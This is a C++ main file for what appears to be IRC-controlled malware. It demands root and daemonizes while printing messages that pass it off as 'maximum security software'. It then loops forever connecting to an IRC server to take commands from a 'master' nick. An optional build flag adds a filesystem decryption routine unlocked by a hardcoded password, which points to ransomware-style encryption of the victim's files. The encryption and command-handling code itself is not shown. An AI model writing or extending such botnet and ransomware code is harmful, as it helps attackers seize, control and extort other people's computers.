#include "IrcClient.hpp"
#ifdef ENABLE_ENCRYPT_ACTION
#include "FileSystemDecryptor.hpp"
#include "GeneralUtils.hpp"
#endif
#include <csignal>
#include <iostream>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

// VERY TEMP, there will be a means implemented to get validation to decrypt files via confirmation from IRC server
const char* STORED_PASS = "UnhackablePassword123!";

void daemonize() {
    pid_t pid = fork();

    if (pid < 0) {
        std::cerr << "Fork failed!" << std::endl;
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    // Create a new session and process group
    if (setsid() < 0) {
        std::cerr << "setsid failed!" << std::endl;
        exit(EXIT_FAILURE);
    }

    // Ignore signal sent from child to parent process
    signal(SIGCHLD, SIG_IGN);

    // Fork again to ensure the daemon cannot acquire a controlling terminal
    pid = fork();

    if (pid < 0) {
        std::cerr << "Fork failed!" << std::endl;
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    // Set new file permissions
    umask(0);

    // Change the working directory to the root directory
    if (chdir("/") < 0) {
        std::cerr << "chdir failed!" << std::endl;
        exit(EXIT_FAILURE);
    }

    // Close all open file descriptors
    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }

    // Redirect standard input, output, and error to /dev/null
    open("/dev/null", O_RDONLY); // stdin
    open("/dev/null", O_WRONLY); // stdout
    open("/dev/null", O_RDWR);   // stderr
}

void ensureRootPrivileges() {
    if (geteuid() != 0) {
        std::cerr << "This program must be run as root. Please use sudo." << std::endl;
        exit(1);
    }
}


#ifdef ENABLE_ENCRYPT_ACTION
void attemptFsDecryption(int argc, char* argv[]) {
    if (argc != 3) {
        return;
    }

    if (!GeneralUtils::cStrAreEqual(argv[1], "DECRYPT")) {
        return;
    }

    if (!GeneralUtils::cStrAreEqual(argv[2], STORED_PASS)) { // VERY TEMP
        return;
    }

    FileSystemDecryptor::decryptFileSystem(GeneralUtils::getFileBaseName(argv[0]));
    exit(0);
}
#endif

bool dontDaemonize(int argc, char* argv[]) {
    if (argc != 2) {
        return false;
    }

    if (!GeneralUtils::cStrAreEqual(argv[1], "NO_DAEMON")) {
        return false;
    }
    return true;
}

int main(int argc, char* argv[]) {
    ensureRootPrivileges();
    #ifdef ENABLE_ENCRYPT_ACTION
    attemptFsDecryption(argc, argv);
    #endif
    if (dontDaemonize(argc, argv)) {
        printf("Keep this running for maximum security!\n");
    } else {
        printf("Running maximum security software as background process!\n");
        daemonize();
    }

    std::string serverAddress = "127.0.0.1";
    std::string botNick = "botNick";
    std::string botUser = "botUser";
    std::string assignedChannel = "#general";
    std::string botPass = "pass";
    std::string masterNick = "master";

    #ifdef SERVER_ADDRESS
        serverAddress = SERVER_ADDRESS;
    #endif

    #ifdef BOT_NICK
        botNick = BOT_NICK;
    #endif

    #ifdef BOT_USER
        botUser = BOT_USER;
    #endif

    #ifdef ASSIGNED_CHANNEL
        assignedChannel = ASSIGNED_CHANNEL;
    #endif

    #ifdef BOT_PASS
        botPass = BOT_PASS;
    #endif

    #ifdef MASTER_NICK
        masterNick = MASTER_NICK;
    #endif

    signal(SIGINT, IrcClient::signalHandler);
    signal(SIGTERM, IrcClient::signalHandler);
    const char* exeName = argv[0];
    while(true) {
        try {
            IrcClient client(serverAddress, 6667, exeName, botNick, botUser, assignedChannel, botPass, masterNick);
            client.connect();
        } catch (const std::exception& ex) {
            std::cerr << "Error: " << ex.what() << std::endl;
        }
    }

    return 0;
}
